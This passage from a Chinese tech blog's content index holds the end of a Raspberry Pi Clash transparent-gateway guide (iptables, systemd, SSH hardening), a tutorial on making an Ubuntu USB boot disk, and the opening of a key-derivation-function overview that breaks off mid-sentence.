</span><br><span class=\"line\">sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT  </span><br><span class=\"line\">sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>为Clash设置全量数据转发</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 新建两条链，clash用于数据访问，clash_dns用于内建DNS</span></span><br><span class=\"line\">sudo iptables -t nat -N clash</span><br><span class=\"line\">sudo iptables -t nat -N clash_dns</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为内建DNS设置NAT转换，从198.18.0.1---&gt;198.19.x.x，同时支持UDP和TCP，但当前版本实际只使用UDP</span></span><br><span class=\"line\"><span class=\"comment\"># 重要：192.168.0.8是你的Clash出口地址，应根据网络环境自行修改！！！</span></span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -d 198.19.0.0/24 -j clash_dns</span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p udp --dport 53 -d 198.19.0.0/24 -j clash_dns</span><br><span class=\"line\">sudo iptables -t nat -A clash_dns -p udp --dport 53 -d 198.19.0.0/24 -j DNAT --to-destination 192.168.0.8:53</span><br><span class=\"line\">sudo iptables -t nat -A clash_dns -p tcp --dport 53 -d 198.19.0.0/24 -j DNAT --to-destination 192.168.0.8:53</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为Clash数据访问建立NAT转换</span></span><br><span class=\"line\">sudo iptables -t nat -A PREROUTING -p tcp -j clash</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 为本机网段、私有网段、保留网段等提供直通车</span></span><br><span class=\"line\">sudo iptables -t nat -A clash -d 0.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 10.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 127.0.0.0/8 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 169.254.0.0/16 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 172.16.0.0/12 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 192.168.0.0/16 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 224.0.0.0/4 -j RETURN</span><br><span class=\"line\">sudo iptables -t nat -A clash -d 240.0.0.0/4 -j RETURN</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 上述条件之外的数据流量，一律转发给7892端口，实现免代理的透明网关</span></span><br><span class=\"line\">sudo iptables -t nat -A clash -p tcp -j REDIRECT --to-ports 7892</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>设置iptables路由表的持久化</p>\n<p> 执行完上面的 iptables 命令之后，就完成了旁路由的路由功能了，但是此时 iptables 并没有永久保存，下次开机上面的配置就会丢失。<br> 为了使得重启之后 iptables 命令仍然存在，我们需要安装<code>iptables-persistent软件</code>来实现(前面步骤二已完成)：<br> 执行以下命令，就即可将最新的 iptables 规则保存下来。</p>\n <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># sudo apt install iptables-persistent</span></span><br><span class=\"line\">sudo sh -c <span class=\"string\">&#x27;iptables-save &gt; /etc/iptables/rules.v4&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>安装的过程中会提示你是否需要保存 iptables 配置，直接选是就行。这时候即使电脑重启了也会应用这些路由规则。</p>\n</blockquote>\n</li>\n</ol>\n<h3 id=\"六、设置Clash开机自启动\"><a href=\"#六、设置Clash开机自启动\" class=\"headerlink\" title=\"六、设置Clash开机自启动\"></a>六、设置Clash开机自启动</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">tee</span> /etc/systemd/system/clash.service &gt; /dev/null &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">[Unit]</span></span><br><span class=\"line\"><span class=\"string\">Description=clash service</span></span><br><span class=\"line\"><span class=\"string\">After=network.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Service]</span></span><br><span class=\"line\"><span class=\"string\">Type=simple</span></span><br><span class=\"line\"><span class=\"string\">User=pi</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\"># Set port permissions capability without root user</span></span><br><span class=\"line\"><span class=\"string\">CapabilityBoundingSet=CAP_NET_BIND_SERVICE</span></span><br><span class=\"line\"><span class=\"string\">AmbientCapabilities=CAP_NET_BIND_SERVICE</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">ExecStart=/usr/bin/clash -d /home/pi/.config/clash</span></span><br><span class=\"line\"><span class=\"string\">Restart=on-failure # or always, on-abort, etc</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">[Install]</span></span><br><span class=\"line\"><span class=\"string\">WantedBy=multi-user.target</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">sudo systemctl <span class=\"built_in\">enable</span> clash</span><br></pre></td></tr></table></figure>\n\n<p>到此为止，Clash透明网关就算是大功告成了，现在可以重启树莓派，检查科学成果了！！！</p>\n<p>当然，从系统安全的角度，做一些扫尾的工作也很重要，包括：</p>\n<ul>\n<li>编辑树莓派的公匙文件<code>mkdir $HOME/.ssh &amp;&amp; vi $HOME/.ssh/authorized_keys</code>，将各台需要管理PC的 RSA 公匙加入</li>\n<li>在树莓派上，设置文件权限并重启ssh服务</li>\n</ul>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo <span class=\"built_in\">chmod</span> 600 <span class=\"variable\">$HOME</span>/.ssh/authorized_keys</span><br><span class=\"line\">sudo <span class=\"built_in\">chmod</span> 700 <span class=\"variable\">$HOME</span>/.ssh/</span><br><span class=\"line\"></span><br><span class=\"line\">sudo systemctl restart sshd</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>在管理PC上，尝试ssh登录，如果免密码成功，就可以关闭口令登录了</li>\n<li>编辑树莓派的<code>sudo vi /etc/ssh/sshd_config</code>，将<code>PasswordAuthentication</code>设为<code>no</code>，以禁止采用口令登录</li>\n</ul>\n<p>这样一来，树莓派就在指定PC上就可以<code>pi</code>用户实现免密码登录，而其它用户、其它PC都无法登录了</p>\n<h2 id=\"Clash透明网关的使用方法\"><a href=\"#Clash透明网关的使用方法\" class=\"headerlink\" title=\"Clash透明网关的使用方法\"></a>Clash透明网关的使用方法</h2><p>首先找到相应SSID，连接AP热点后自动设置默认网关和DNS，浏览器打开直接上网，再也不用 HTTP 或 SOCK5 代理了。<br>如果想要观察Clash运行情况，可以在浏览器打开<a href=\"http://192.168.0.8:9090/ui]\">http://192.168.0.8:9090/ui</a></p>\n<p>Clash的配置是一件比较复杂的工作，准备下次专门讨论，这里就不啰嗦了。</p>\n<hr>\n<h2 id=\"补充问题\"><a href=\"#补充问题\" class=\"headerlink\" title=\"补充问题\"></a>补充问题</h2><h3 id=\"附录1-Clash的Home目录结构\"><a href=\"#附录1-Clash的Home目录结构\" class=\"headerlink\" title=\"附录1: Clash的Home目录结构\"></a>附录1: Clash的Home目录结构</h3><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">pi@raspberrypi:~ $ tree <span class=\"variable\">$HOME</span>/.config/clash/</span><br><span class=\"line\">/home/pi/.config/clash/</span><br><span class=\"line\">├── config.yaml</span><br><span class=\"line\">├── Country.mmdb</span><br><span class=\"line\">└── uacd-dashboard</span><br><span class=\"line\">    ├── 9.e5ebc45c57147750a8b7.js</span><br><span class=\"line\">    ├── app.2710ac87312332833aa4.js</span><br><span class=\"line\">    ├── app.2710ac87312332833aa4.js.LICENSE.txt</span><br><span class=\"line\">    ├── app.bb773b8bdd4263de9ffd.css</span><br><span class=\"line\">    ├── CNAME</span><br><span class=\"line\">    ├── core-js~app.4e0935a458133ffa9ca3.js</span><br><span class=\"line\">    ├── _headers</span><br><span class=\"line\">    ├── index.html</span><br><span class=\"line\">    ├── open-sans-latin-400.woff2</span><br><span class=\"line\">    ├── open-sans-latin-700.woff2</span><br><span class=\"line\">    ├── proxies.1e31d885e6fe278da534.css</span><br><span class=\"line\">    ├── proxies.beaddeef3e0db08db953.js</span><br><span class=\"line\">    ├── react~app.10618449a8e9b56a1845.js</span><br><span class=\"line\">    ├── react~app.10618449a8e9b56a1845.js.LICENSE.txt</span><br><span class=\"line\">    ├── report.html</span><br><span class=\"line\">    ├── roboto-mono-latin-400.woff2</span><br><span class=\"line\">    ├── rules.3ba17dd53c9d8bd8b221.css</span><br><span class=\"line\">    ├── rules.90faad053acc32c74a88.js</span><br><span class=\"line\">    ├── runtime.30479c2b09f71505cee3.js</span><br><span class=\"line\">    ├── vendors~chartjs.e4543f10556636d64b75.js</span><br><span class=\"line\">    ├── vendors~chartjs.e4543f10556636d64b75.js.LICENSE.txt</span><br><span class=\"line\">    ├── vendors~proxies.34b4cb2526b2e8ed766c.js</span><br><span class=\"line\">    ├── vendors~rules.b2e93c21da80f9dc4a80.js</span><br><span class=\"line\">    ├── yacd-128.png</span><br><span class=\"line\">    ├── yacd-64.png</span><br><span class=\"line\">    └── yacd.ico</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"附录2：关于avahi服务\"><a href=\"#附录2：关于avahi服务\" class=\"headerlink\" title=\"附录2：关于avahi服务\"></a>附录2：关于avahi服务</h3><p><code>Zeroconf</code>（Zero configuration networking）零配置网络服务规范，是一种用于自动生成可用IP地址的网络技术，不需要额外的手动配置和专属的配置服务器。</p>\n<p>Zeroconf规范的提出者是Apple公司，目标是让非专业用户也能便捷的连接各种网络设备，例如计算机，打印机等。整个搭建网络的过程都是通过程式自动化实现。如果没有 zeroconf，用户必须手动配置一些服务，例如DHCP、DNS，计算机网络的其他设置等。这些对非技术用户和新用户们来说是很难的事情。</p>\n<p><code>Avahi</code> 是Zeroconf规范的开源实现，常见使用在Linux上。包含了一整套多播DNS(multicastDNS)&#x2F;DNS-SD网络服务的实现。它使用 的发布授权是LGPL。Zeroconf规范的另一个实现是Apple公司的Bonjour程式。<code>Avahi</code>和<code>Bonjour</code>相互兼容(废话，都走同一个 规范标准嘛，就象IE，Firefox，chrome都能跑HTTP1.1一样)。</p>\n<p><code>Avahi</code>允许程序在不需要进行手动网络配置的情况 下，在一个本地网络中发布和获知各种服务和主机。例如，当某用户把他的计算机接入到某个局域网时，如果他的机器运行有Avahi服务，则Avahi程式自 动广播，从而发现网络中可用的打印机、共享文件和可相互聊天的其他用户。这有点象他正在接收局域网中的各种网络广告一样。</p>\n<p>Linux下系统实际启动的进程名，是<code>avahi-daemon</code>。除非你有兼容的设备或使用 zeroconf 协议的服务，否则应该关闭它。</p>\n<h2 id=\"参考目录\"><a href=\"#参考目录\" class=\"headerlink\" title=\"参考目录\"></a>参考目录</h2><p>核心参考文献</p>\n<ul>\n<li><a href=\"https://cherysunzhang.com/2020/05/deploy-clash-as-transparent-proxy-on-raspberry-pi/\">在 Raspberry Pi上运行Clash作为透明代理</a></li>\n<li><a href=\"https://blog.nicesite.win/2017/08/16/soft-router/\">在树莓派上搭建软路由</a></li>\n<li><a href=\"https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li\">使用PVE运行Clash旁路由虚拟机实现透明代理</a></li>\n<li><a href=\"https://www.joxrays.com/raspberry-wifi-router/\">树莓派搭建简略WiFi无线路由器</a></li>\n<li><a href=\"https://blog.serenader.me/shi-yong-pve-yun-xing-clash-pang-lu-you-xu-ni-ji-shi-xian-tou-ming-dai-li\">使用 PVE 运行 Clash 旁路由虚拟机实现透明代理</a></li>\n<li><a href=\"https://breakertt.moe/2019/08/20/clash_gateway/index.html\">Ubuntu18.04 上使用 clash 部署旁路代理网关</a></li>\n</ul>\n<p>关于网络协议</p>\n<ul>\n<li><a href=\"https://www.zsythink.net/archives/1199\">iptables经典教材</a></li>\n<li><a href=\"https://lesca.me/archives/iptables-nat-mangle-clear-rules.html\">iptables的命令解释</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E4%BF%9D%E7%95%99IP%E5%9C%B0%E5%9D%80\">IPv4的保留IP地址定义</a></li>\n<li><a href=\"http://www.enkichen.com/2017/05/23/dnsmasq-introduce/\">Dnsmasq配置文件详解</a></li>\n<li><a href=\"https://www.ibm.com/developerworks/cn/linux/l-wifiencrypthostapd/index.html\">Hostapd配置文件详解</a></li>\n</ul>\n<p>关于Clash</p>\n<ul>\n<li><a href=\"https://github.com/Dreamacro/clash\">Clash的Github官方网站</a></li>\n<li><a href=\"https://lancellc.gitbook.io/clash/clash-config-file/dns\">Clash的Gitbook官方文档</a></li>\n<li><a href=\"https://tlanyan.me/v2ray-clients-download/\">V2ray的主流客户端</a></li>\n<li><a href=\"https://blog.skk.moe/post/alternate-surge-koolclash-as-gateway/#redir-host-%E7%9A%84%E9%97%AE%E9%A2%98\">关于Clash自带DNS服务器的fake-ip模式</a></li>\n<li><a href=\"https://www.v2rayssr.com/clashxx.html\">Clash的配置文件示例</a></li>\n<li><a href=\"https://lancellc.gitbook.io/clash/clash-config-file/an-example-configuration-file\">Clash的配置文件示例2</a></li>\n</ul>\n"},{"title":"如何制作Ubuntu的USB启动盘","url":"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/","content":"<p>这个周末新入手一台INTEL的NUC主机，八代i3版本，另外新购8G DDR4内存 + 256G NVME SSD硬盘.<br>本次采购是为了将网站改造为VPS + 本地Linux Server的模式，为此需要为NUC主机安装Ubuntu的Server版本。</p>\n<h2 id=\"Step-0-准备工作\"><a href=\"#Step-0-准备工作\" class=\"headerlink\" title=\"Step 0: 准备工作\"></a>Step 0: 准备工作</h2><ul>\n<li>An Intel NUC with BIOS updated to the latest version (update instructions)</li>\n<li>A USB 2.0 or 3.0 flash drive (4GB minimum for Dawson Canyon NUCs, 2GB for older generations)</li>\n<li><em><strong>A USB keyboard and a mouse</strong></em></li>\n<li>A monitor with an HDMI interface</li>\n<li>An HDMI cable</li>\n<li>A network connection with Internet access</li>\n</ul>\n<h2 id=\"Step-1：下载Ubuntu的ISO镜像文件\"><a href=\"#Step-1：下载Ubuntu的ISO镜像文件\" class=\"headerlink\" title=\"Step 1：下载Ubuntu的ISO镜像文件\"></a>Step 1：下载Ubuntu的ISO镜像文件</h2><ul>\n<li>Browser打开<a href=\"https://ubuntu.com/download/desktop\">Ubuntu官方网站</a></li>\n<li>寻找合适版本的ISO映像文件并下载，<em><strong>推荐采用BT下载方式。</strong></em></li>\n</ul>\n<img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/ubuntu-1.png\" class=\"\" title=\"Etcher的制作界面\">\n\n<blockquote>\n</blockquote>\n<pre><code>目前最新稳定版是Ubuntu 20，但从兼容性考虑，本次下载的是LTE长期稳定版v18.4.4\n可用版本分为Desktop和Server两种版本，本次选用Sever版本（大约900M，桌面版超过2G）\n在v16以前，除了主流的64位amd64 版本，还有32位的i386版本\n</code></pre>\n<img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/ubuntu-2.png\" class=\"\" title=\"Etcher的制作界面\">\n\n<h2 id=\"Step-2：格式化U盘\"><a href=\"#Step-2：格式化U盘\" class=\"headerlink\" title=\"Step 2：格式化U盘\"></a>Step 2：格式化U盘</h2><ul>\n<li>在Mac中打开<code>应用-&gt;其它-&gt;磁盘工具</code></li>\n<li>选择U盘，然后擦除。<em><strong>千万别选错了Mac的硬盘啊！！</strong></em></li>\n<li>选择格式: MS-DOS (FAT)，并执行“擦除”</li>\n</ul>\n<h2 id=\"Step-3-下载并安装Etcher工具\"><a href=\"#Step-3-下载并安装Etcher工具\" class=\"headerlink\" title=\"Step 3: 下载并安装Etcher工具\"></a>Step 3: 下载并安装Etcher工具</h2><blockquote>\n</blockquote>\n<pre><code>用于格式化和创建可引导USB闪存盘的工具主要有：Etcher 和 Rufus\nEther是Balena公司提供的开源软件，最大的优点是可以跨平台使用\n</code></pre>\n<ul>\n<li>Browser打开<a href=\"https://www.balena.io/etcher/\">Ether下载页面</a>，选择mac版本并下载</li>\n<li>打开DMG文件，并根据提示信息完成安装，过程中可能出现需要允许安装第三方软件的告警提示</li>\n</ul>\n<h2 id=\"Step-4-Etcher制作USB启动盘\"><a href=\"#Step-4-Etcher制作USB启动盘\" class=\"headerlink\" title=\"Step 4: Etcher制作USB启动盘\"></a>Step 4: Etcher制作USB启动盘</h2><img src=\"/2020/06/07/%E5%A6%82%E4%BD%95%E5%88%B6%E4%BD%9CUbuntu%E7%9A%84USB%E5%90%AF%E5%8A%A8%E7%9B%98/Etcher.jpg\" class=\"\" title=\"Etcher的制作界面\">\n\n<ul>\n<li>选择ISO镜像文件</li>\n<li>选择USB驱动器，<em><strong>不要搞错了硬盘</strong></em></li>\n<li>写入USB盘，大概需要十分钟后，大功告成！</li>\n</ul>\n<hr>\n<h2 id=\"疑难杂症：如何恢复USB启动盘的硬盘分区\"><a href=\"#疑难杂症：如何恢复USB启动盘的硬盘分区\" class=\"headerlink\" title=\"疑难杂症：如何恢复USB启动盘的硬盘分区\"></a>疑难杂症：如何恢复USB启动盘的硬盘分区</h2><p>制作过Ubuntu iso的U盘会变成只有几M的空间，格式化也没有用，原因是Etcher修改了硬盘分区表。<br>解决办法是，在Windows下搜索运行<code>diskpart</code>软件，参考命令行是：</p>\n<pre><code><figure class=\"highlight cmd\"><table><tr><td class=\"code\"><pre><span class=\"line\">DISKPART&gt; list disk</span><br><span class=\"line\">DISKPART&gt; select disk <span class=\"number\">2</span> （具体选<span class=\"number\">1</span>还是<span class=\"number\">2</span>要根据实际情况，小心操作！！）</span><br><span class=\"line\">DISKPART&gt; clean</span><br><span class=\"line\">DISKPART&gt; create partition primary</span><br><span class=\"line\">DISKPART&gt; <span class=\"keyword\">exit</span></span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>而如果在Linux下，那就更简单了，用fdisk命令就行。</p>\n<pre><code><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">fdisk -l</span> </span><br><span class=\"line\">列出/dev 下面的所有硬盘设备，例如 /dev/sda， /dev/sdb， /dev/sdc</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$ </span><span class=\"language-bash\">fdisk /dev/sdb</span></span><br><span class=\"line\">选择需要修改的硬盘，按照命令提升处理，大致是：</span><br><span class=\"line\">    p 列出分区表</span><br><span class=\"line\">    d 删除分区</span><br><span class=\"line\">    n 新建分区</span><br><span class=\"line\">    w 存盘退出！！！</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>补充以下，如果在Mac OS上，虽然没有<code>fdisk</code>命令，但是可以用<code>diskutil</code>命令代替</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">JiandeiMac:~ sj$ diskutil</span><br><span class=\"line\">Disk Utility Tool</span><br><span class=\"line\">Utility to manage <span class=\"built_in\">local</span> disks and volumes</span><br><span class=\"line\">Most commands require an administrator or root user</span><br><span class=\"line\"></span><br><span class=\"line\">WARNING: Most destructive operations are not prompted</span><br><span class=\"line\"></span><br><span class=\"line\">Usage:  diskutil [quiet] &lt;verb&gt; &lt;options&gt;, <span class=\"built_in\">where</span> &lt;verb&gt; is as follows:</span><br><span class=\"line\"></span><br><span class=\"line\">    list                 (List the partitions of a disk)</span><br><span class=\"line\">    info[rmation]        (Get information on a specific disk or partition)</span><br><span class=\"line\">    listFilesystems      (List file systems available <span class=\"keyword\">for</span> formatting)</span><br><span class=\"line\">    activity             (Continuous <span class=\"built_in\">log</span> of system-wide disk arbitration)</span><br><span class=\"line\"></span><br><span class=\"line\">    u[n]mount            (Unmount a single volume)</span><br><span class=\"line\">    unmountDisk          (Unmount an entire disk (all volumes))</span><br><span class=\"line\">    eject                (Eject a disk)</span><br><span class=\"line\">    mount                (Mount a single volume)</span><br><span class=\"line\">    mountDisk            (Mount an entire disk (all mountable volumes))</span><br><span class=\"line\"></span><br><span class=\"line\">    enableJournal        (Enable HFS+ journaling on a mounted HFS+ volume)</span><br><span class=\"line\">    disableJournal       (Disable HFS+ journaling on a mounted HFS+ volume)</span><br><span class=\"line\">    moveJournal          (Move the HFS+ journal onto another volume)</span><br><span class=\"line\">    enableOwnership      (Exact on-disk User/Group IDs on a mounted volume)</span><br><span class=\"line\">    disableOwnership     (Ignore on-disk User/Group IDs on a mounted volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    rename[Volume]       (Rename a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    verifyVolume         (Verify the file system data structures of a volume)</span><br><span class=\"line\">    repairVolume         (Repair the file system data structures of a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    verifyDisk           (Verify the components of a partition map of a disk)</span><br><span class=\"line\">    repairDisk           (Repair the components of a partition map of a disk)</span><br><span class=\"line\"></span><br><span class=\"line\">    eraseDisk            (Erase an existing disk, removing all volumes)</span><br><span class=\"line\">    eraseVolume          (Erase an existing volume)</span><br><span class=\"line\">    reformat             (Erase an existing volume with same name and <span class=\"built_in\">type</span>)</span><br><span class=\"line\">    eraseOptical         (Erase optical media (CD/RW, DVD/RW, etc.))</span><br><span class=\"line\">    zeroDisk             (Erase a disk, writing zeros to the media)</span><br><span class=\"line\">    randomDisk           (Erase a disk, writing random data to the media)</span><br><span class=\"line\">    secureErase          (Securely erase a disk or freespace on a volume)</span><br><span class=\"line\"></span><br><span class=\"line\">    partitionDisk        ((re)Partition a disk, removing all volumes)</span><br><span class=\"line\">    resizeVolume         (Resize a volume, increasing or decreasing its size)</span><br><span class=\"line\">    splitPartition       (Split an existing partition into two or more)</span><br><span class=\"line\">    mergePartitions      (Combine two or more existing partitions into one)</span><br><span class=\"line\"></span><br><span class=\"line\">    appleRAID &lt;verb&gt;     (Perform additional verbs related to AppleRAID)</span><br><span class=\"line\">    coreStorage &lt;verb&gt;   (Perform additional verbs related to CoreStorage)</span><br><span class=\"line\">    apfs &lt;verb&gt;          (Perform additional verbs related to APFS)</span><br><span class=\"line\"></span><br><span class=\"line\">diskutil &lt;verb&gt; with no options will provide help on that verb</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</code></pre>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://ubuntu.com/download/intel-nuc-desktop\">Ubuntu关于NUC安装的官方说明</a></li>\n<li><a href=\"https://linux.cn/article-11477-1.html\">NUC主机安装Ubuntu的操作案例</a></li>\n<li><a href=\"https://tutorials.ubuntu.com/tutorial/tutorial-create-a-usb-stick-on-macos\">制作启动USB盘的Ubuntu官方教程</a></li>\n<li><a href=\"http://www.eguidedog.net/doc/doc-create-usb-stick-on-windows.php\">Windows如何制作Ubuntu系统的USB启动盘</a></li>\n<li><a href=\"https://github.com/balena-io/etcher\">Etcher的Github地址</a></li>\n</ul>\n"},{"title":"密钥派生函数（KDF）概述","url":"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/","content":"<h2 id=\"一、什么是-KDF\"><a href=\"#一、什么是-KDF\" class=\"headerlink\" title=\"一、什么是 KDF\"></a>一、什么是 KDF</h2><p>KDF（Key Derivation Function）的最初用途是密钥派生，即从秘密密码或密码短语生成密钥。</p>\n<h3 id=\"1、密钥拉伸（Key-Stretching）\"><a href=\"#1、密钥拉伸（Key-Stretching）\" class=\"headerlink\" title=\"1、密钥拉伸（Key Stretching）\"></a>1、密钥拉伸（Key Stretching）</h3><p>在系统要求用户设置密码时，我们习惯用4-6位的数字组合，或者字母、数字和特殊符号的某种组合，这种密码强度肯定无法抵御暴力破解、字典攻击、彩虹表攻击等技术手段，密钥派生函数由此应运而生。</p>\n<p>KDF 最基础的用途是将密码和其他弱密钥材料来源转换为强密钥，文绉绉地说，就是采用具有低熵（安全性或随机性）的密钥，并将其扩展为更安全的更长密钥。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">derivedKey = <span class=\"title function_\">keyDerivationFunction</span>(originalKey, salt, difficulty)</span><br></pre></td></tr></table></figure>\n\n<p>密钥派生函数接受一个密码（或其他弱密钥材料）作为输入，通过一个特殊函数运行它，然后输出安全密钥材料，关键点是增加了一个随机数作为加密因子，这个随机数被称为<strong>盐（Salt）</strong>，针对预计算攻击或rainbow表的随机数据，而<code>difficulty</code> 是难度系数的标记，例如迭代计算的次数。</p>\n<p><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/key-derivation-function.png\" alt=\"KDF\"></p>\n<p>以Apple数据保护技术为例，就是将4-6位的用户锁屏密码<code>Passcode</code>转化为256位的密文<code>Passcode Key</code>。</p>\n<h3 id=\"2、密钥分离（Key-Separation）\"><a href=\"#2、密钥分离（Key-Separation）\" class=\"headerlink\" title=\"2、密钥分离（Key Separation）\"></a>2、密钥分离（Key Separation）</h3><p>KDF允许从单一的密钥材料（主密钥）生成多个不同用途的子密钥，方法是通过使用不同的 salt 随机数，这也被称为密钥多样化（Key Diversification）。</p>\n<p>这种方式可以防止获得派生密钥的攻击者学习关于输入秘密值或任何其他派生密钥的有用信息，子密钥可以控制业务的某个部分，但只有主密钥具有完全控制权。例如，Apple 的 Secure Enclave 就以 UID 为根，派生出用于保护 Class Key 的<code>Key 0x835</code>和 用于保护 EMF Key 的<code>Key 0x89B</code>。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x835</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;01010101010101010101010101010101&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x836</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;00E5A0E6526FAE66C5C1C6D4F16D6180&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x838</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;8C8318A27D7F030717D2B8FC5514F8E1&quot;</span>))</span><br><span class=\"line\"><span class=\"title class_\">Key</span> <span class=\"number\">0x89B</span> = <span class=\"title function_\">KDF</span>(<span class=\"variable constant_\">UID</span>, <span class=\"title function_\">bytes</span>(<span class=\"string\">&quot;183e99676bb03c546fa468f51c0cbd49&quot;</span>))</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、密钥强化（Key-Strengthening）\"><a href=\"#3、密钥强化（Key-Strengthening）\" class=\"headerlink\" title=\"3、密钥强化（Key Strengthening）\"></a>3、密钥强化（Key Strengthening）</h3><p>密钥强化同样使用随机盐扩展密钥，但随后<strong>删除该盐</strong>，这使得生成的密钥更强壮，但也意味着后续无法直接验证，<strong>即使合法用户也必须进行暴力破解验证</strong>。<br>但是，由于合法用户掌握了passcode等部分信息，暴力破解难度远远低于非法用户，但仍然需要消耗大量算力，因此实际应用中并不多见。</p>\n<h2 id=\"二、KDF-Vs-Hash\"><a href=\"#二、KDF-Vs-Hash\" class=\"headerlink\" title=\"二、KDF Vs Hash\"></a>二、KDF Vs Hash</h2><p>理论上，KDF 可以采用 3DES 或 AES 等对称算法，好处是可以通过密钥恢复原文，但密钥保管是个大麻烦，一旦泄露所有密码就全部暴露，因此在实际应用中主要采用哈希算法。</p>\n<p>一个理想的加密哈希函数，应当具有如下属性：</p>\n<ul>\n<li>快速：计算速度要足够快</li>\n<li>确定性：对同样的输入，应该总是产生同样的输出</li>\n<li>难以分析：对输入的任何微小改动，都应该使输出完全发生变化</li>\n<li>不可逆：从其哈希值逆向演算出输入值应该是不可行的。这意味着暴力破解是唯一方法</li>\n<li>无碰撞：找到具有相同哈希值的两条不同消息应该非常困难（或几乎不可能）</li>\n</ul>\n<p>这些特点非常适合密钥派生的业务场景，可以确保即使密码文件本身被泄露也能保护密码，同时又能方便地验证用户密码，代价是要同时保存每个用户的密文和随机数。</p>\n<p><img src=\"/2022/10/18/%E5%AF%86%E9%92%A5%E6%B4%BE%E7%94%9F%E5%87%BD%E6%95%B0%EF%BC%88KDF%EF%BC%89%E6%A6%82%E8%BF%B0/KDF.png\" alt=\"KDF Vs Hash\"><br>可以证明，所有基于哈希的 KDF 都是安全的哈希函数，但并非所有哈希函数都是基于哈希的 KDF。<br>尽管高吞吐量是通用哈希函数的理想属性，但在密码安全应用程序中则相反，防御暴力破解是主要关注点，因此 KDF 要求的是<strong>故意缓慢的哈希算法</strong>。</p>\n<p>KDF 计算速度的”慢”是相对而言的，对于普通用户而言，KDF 